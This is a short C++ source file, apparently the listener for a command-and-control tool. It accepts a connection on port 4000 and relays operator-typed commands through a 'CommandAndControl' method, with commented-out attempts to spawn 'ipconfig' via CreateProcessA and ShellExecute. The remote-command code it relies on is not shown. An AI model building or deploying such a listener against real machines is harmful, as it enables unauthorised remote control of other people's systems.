#include "server.h"


int main()
{
	//STARTUPINFO si;
	//PROCESS_INFORMATION pi;

	//ZeroMemory(&si, sizeof(si));
	//si.cb = sizeof(si);

	//ZeroMemory(&pi, sizeof(pi));

	//CreateProcessA(NULL, (LPSTR)"ipconfig", NULL, NULL, FALSE, 0, NULL, NULL, (LPSTARTUPINFOA) &si, &pi);

	//ShellExecute(NULL, (LPCTSTR)"open", (LPCTSTR)"cmd.exe", (LPCTSTR)"ipconfig", NULL, SW_SHOWNORMAL);
	std::string cmd;
	Server server("4000");
	server.Accept();
	auto [ip, port] = server.GetConnectionInfo();
	std::cout << "[+] Accetped connection from ip: " << ip << ", port: " << port <<std::endl;

	do
	{
		std::cout << ">> ";
		std::getline(std::cin, cmd);
		server.CommandAndControl(cmd, cmd.size());
	} while (cmd != "Exit");
	
}

